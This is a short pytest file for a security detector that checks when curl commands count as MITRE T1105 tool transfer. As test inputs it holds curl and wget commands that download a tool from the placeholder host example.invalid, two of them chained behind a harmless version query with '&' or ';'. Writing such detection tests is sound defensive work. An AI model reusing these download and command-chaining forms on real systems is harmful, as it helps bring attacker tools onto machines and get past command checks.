from datetime import datetime, timezone

import pytest

from aegis_on.engine import RuleDetector
from aegis_on.models import SecurityEvent


def findings(command):
    event = SecurityEvent(datetime.now(timezone.utc), 'test-host', 'test-user',
                          'curl.exe', command)
    return [d.technique for d in RuleDetector().detect(event)]


@pytest.mark.parametrize('command', [
    'curl --version',
    'curl.exe -V',
    r'C:\lab\curl.exe --version',
    r'"C:\test tools\curl.exe" --version',
])
def test_standalone_version_query_is_not_a_tool_transfer(command):
    assert 'T1105' not in findings(command)


@pytest.mark.parametrize('command', [
    'curl -v https://example.invalid/tool',
    'curl --version https://example.invalid/tool',
    'curl --version & curl https://example.invalid/tool',
    'curl --version; wget https://example.invalid/tool',
    'curl https://example.invalid/tool',
])
def test_requests_and_compound_commands_remain_reviewable(command):
    assert 'T1105' in findings(command)
